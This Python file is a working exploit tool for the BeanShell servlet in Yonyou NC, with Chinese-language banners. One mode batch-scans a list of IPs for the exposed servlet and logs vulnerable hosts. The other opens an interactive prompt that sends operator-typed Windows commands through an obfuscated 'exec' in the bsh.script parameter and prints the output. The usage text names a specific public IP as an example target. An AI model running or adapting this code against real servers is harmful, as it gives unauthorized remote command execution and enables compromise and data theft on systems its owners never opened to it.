import os
import requests
from bs4 import BeautifulSoup
from argparse import ArgumentParser
from colorama import init, Fore, Back, Style

init(autoreset=True)

proxy='127.0.0.1:8080'


def file_read(IP_text):
    with open(IP_text, "r") as f:
        return [i.replace("\n", "") for i in f.readlines()]


def title():
    print('-------------------用友NC检测-----------------------')
    print('版本: 用友NC beanshell 漏洞复现 4-13号       ')
    print('author: M1                              ')
    print('------------------------------------------   ')


def JuHead(url):
    if "http://" in url:
        return url
    if "https://" in url:
        return url
    if "http" not in url:
        return "http://" + url


def getUserNamelist(response):
    encoding = "utf-8"
    soup = BeautifulSoup(response, "lxml")

    for tag in soup.find_all('body'):
        m_name = tag.find('pre')
        res = str(m_name).strip('<pre>').strip('\n').strip('</pre>')
        if (res == 'Non'):
            pass
        else:
            print('\033[7;0;32m ' + res)


def POC_1(target_url, w):
    core_url = target_url + "/servlet/~ic/bsh.servlet.BshServlet"  # poc
    try:
        response = requests.request("GET", url=core_url, timeout=5)
        # print(response.text)
        if response.status_code == 200 and '/servlet/~ic/bsh.servlet.BshServlet' in response.text:  # 返回200

            print("\033[7;0;32m存在漏洞{}".format(target_url))
            w.write((target_url + os.linesep).encode('utf-8'))
        else:
            print("\033[1;31;40m目标{}不存在漏洞".format(target_url))

    except Exception as e:
        print("请求失败", e)


def EXP_1(target_url, common):
    core_url = target_url + "/servlet/~ic/bsh.servlet.BshServlet"
    data = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'bsh.script': 'ex\u0065c("cmd /c ' + common + '");'}
    response = requests.request("POST", url=core_url, data=data, timeout=20).text.strip()
    # ex\u0065c("cmd /c net user");

    getUserNamelist(response)


if __name__ == '__main__':
    arg = ArgumentParser(description="test.py -u http://218.253.73.210:5500/")
    arg.add_argument('-u', help='target URL', dest='url', type=str)
    arg.add_argument('-f', help='IP.txt', dest='file', type=str)
    # arg.add_argument('-m', help='eg. whoami', dest='common', type=str)

    argv = arg.parse_args()
    title()
    if argv.url:
        target_url = JuHead(argv.url)  # 单个IP利用
        while (True):
            cmd = str(input("$cmd>"))
            if (cmd == 'q'):
                break
            EXP_1(target_url, cmd)

    if argv.file:
        IP_text = argv.file  # 批量检测
        print(IP_text)
        w = open('result.txt', 'wb+')
        for ip in file_read(IP_text):
            target_url = JuHead(ip)
            POC_1(target_url, w)
        w.close()
